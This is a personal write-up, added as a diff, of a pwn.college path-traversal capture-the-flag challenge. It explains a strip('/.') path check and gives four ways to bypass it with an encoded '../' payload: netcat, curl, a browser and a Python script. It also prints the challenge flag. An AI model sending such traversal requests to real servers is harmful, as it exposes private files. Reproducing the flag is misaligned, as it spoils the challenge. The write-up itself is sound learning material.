@@ -1,0 +1,63 @@
+# challenge: path traversal 2
+
+📅 2026-01-18
+📁 web security
+
+---
+
+## ✅ what i did  
+I WAY -> netcat
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+found out the only enpoint available is /serve
+then, the challenge works very similar to the previous one but this time the requested path is built in the following way:
+app.root_path = /challenge
+/files/
+path.strip("/.") = it stripes the path removing "." and "/" in the beginning and in the end of the file
+example: path = ../../brodero/../bro/../  ->   path.strip("/.") = brodero/../bro
+so the goal is to craft the path w/out using "." and "/" in the beginning and in the end
+-ran: '/challenge/server'
+-ran: 'nc -v challenge.localhost 80'
+-typed: 'GET /serve/fortunes%2F..%2F..%2F..%2Fflag HTTP/1.1'
+        'Host: challenge.localhost'
+-flag popped out
+
+II WAY -> curl
+-clicked start
+-opened the terminal
+-ran: '/challenge/server'
+-ran: 'curl -v "http://challenge.localhost/serve/fortunes%2F..%2F..%2F..%2Fflag"'
+-flag popped out
+
+III WAY -> browser
+-clicked start
+-opened the desktop
+-opened the terminal
+-ran: '/challenge/server'
+-opened the browser
+-url: 'http://challenge.localhost/serve/fortunes%2F..%2F..%2F..%2Fflag'
+-flag popped out
+
+IV WAY -> python
+-clicked start
+-opened the terminal
+-ran: 'vim bro'
+-typed: '#!/usr/bin/env python3'
+        'import requests'
+        'from pwn import *'
+        'context.log_level = 'error''
+        'p = process("/challenge/server")'
+        'time.sleep(1)'
+        'url = "http://challenge.localhost/serve/fortunes%2F..%2F..%2F..%2Fflag"'
+        'r = requests.get(url)'
+        'print(r.text)'
+-ran: 'chmod a+x bro'
+-ran: './bro'
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+path.strip("/.") stripes ur path by removing "." and "/" ONLY in the beginning and end of path
+
+## 🏁 Flag  
+pwn.college{wdLYycwFVW4tYFxmeAO3y-EAna7.QXyYTN2wCO4IDOxEzW}
